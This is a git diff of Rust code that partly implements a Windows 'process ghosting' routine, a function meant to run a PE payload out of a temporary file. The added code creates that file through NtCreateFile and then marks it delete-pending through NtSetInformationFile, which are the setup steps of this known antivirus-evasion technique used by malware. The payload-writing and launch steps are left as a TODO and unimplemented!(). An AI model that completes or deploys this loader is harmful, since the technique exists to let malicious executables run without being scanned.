@@ -4,6 +4,7 @@ use core::ptr::null_mut;
 use crate::debug;
 use crate::core::nt;
 use crate::core::types::*;
+use crate::core::win32;
 
 pub struct Config<'a> {
     pub pe_payload: &'a [u8],
@@ -70,8 +71,64 @@ pub unsafe fn ghost_process(config: &Config) -> Option<State> {
     let mut state = State::new();
 
     let temp_path = generate_temp_path();
+    let mut file_path_unicode_string = UnicodeString {
+        length: 0,
+        maximum_length: 0,
+        buffer: null_mut(),
+    };
+    win32::rtl_init_unicode_string(&mut file_path_unicode_string, temp_path.as_ptr());
+    let mut obj_attr: ObjectAttributes = core::mem::zeroed();
+    initialize_object_attributes(
+        &mut obj_attr,
+        &mut file_path_unicode_string, 
+        0x00000040, 
+        null_mut(), 
+        null_mut()
+    );
+
+    let mut io_status: IoStatusBlock = core::mem::zeroed();
+    let status = nt::nt_create_file(
+        &mut state.file_handle,
+        0x00010000 | 0x00100000 | 0x80000000 | 0x40000000,
+        &mut obj_attr,
+        &mut io_status,
+        null_mut(),
+        0x00000080,
+        0,
+        0x00000005,
+        0x00000060, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
+        null_mut(),
+        0,
+    );
+
+    if status != STATUS_SUCCESS || state.file_handle.is_null() {
+        debug!("[GHOST] NtCreateFile failed: 0x{:08X}", status);
+        return None;
+    }
+    debug!("[GHOST] Temp file created, handle: {:p}", state.file_handle);
+
+    // Mark the file DELETE_PENDING
+    let mut disposition_infomration = FileDispositionInformation{ delete_file: 1 };
+    io_status = core::mem::zeroed();
+    let status = nt::nt_set_information_file(
+        state.file_handle,  
+        &mut io_status, 
+        &mut disposition_infomration as *mut _ as *mut c_void,
+        core::mem::size_of::<FileDispositionInformation>() as u32,
+        13 as u32
+    );
+    if status != STATUS_SUCCESS {
+        debug!("[GHOST] NtSetInfformationFile failed: 0x{:08X}", status);
+        return None;
+    }
+    debug!("[GHOST] File marked DELETE_PENDING");
 
 
+    /*
+    TODO:
+        Write PE payload into the deleted pending file with explicit offset
+        Supply ByteOffset AND check io_status.information so partial wites cannot silently currupt the PE layout 
+    */
     unimplemented!()
 }
 
@@ -142,3 +199,4 @@ unsafe fn generate_temp_path() -> [u16; 48] {
 
     path
 }
+
